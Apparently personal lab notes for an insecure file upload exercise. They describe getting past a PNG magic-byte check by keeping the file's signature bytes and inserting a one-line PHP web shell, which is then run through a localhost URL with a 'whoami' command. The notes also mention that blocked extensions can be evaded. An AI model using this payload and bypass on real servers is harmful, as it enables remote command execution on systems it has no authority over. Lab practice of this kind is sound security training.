
### Insecure File upload Lab 0x02

-  **How is this lab diff from lab 1** :
	- Here once you upload a text file instead of a image file. the server validates it. that is even if you bypass the validation by changing the `filename=""` in burp suite it won't work.  

- **So how do we do it.**
	-  Open request in burp. 
	-  Then we have to keep the file signature or the files **magicbyte** that is this `**PNG** `: ![[magic byte in a file.png]]
	- So to bypass we have to keep first 1 line or 2 lines then delete the middle part and keep 1 or 2 lines in end.
	- Lets go with the basic php payload : `<?php system($_GET['cmd']); ?>
		- ![[after deleting the middle part.png]]
		- ![[file uploaded after deleting middle part.png]]
		-  And when i access cmdlab.php through url : 
			- ` http://localhost/labs/uploads/cmdlab.php?cmd=whoami `
			- ![[whoami output in file upload lab 0x02.png]]
# IF the server is blocking set of file extensions, then the attacker can create a custom type and execute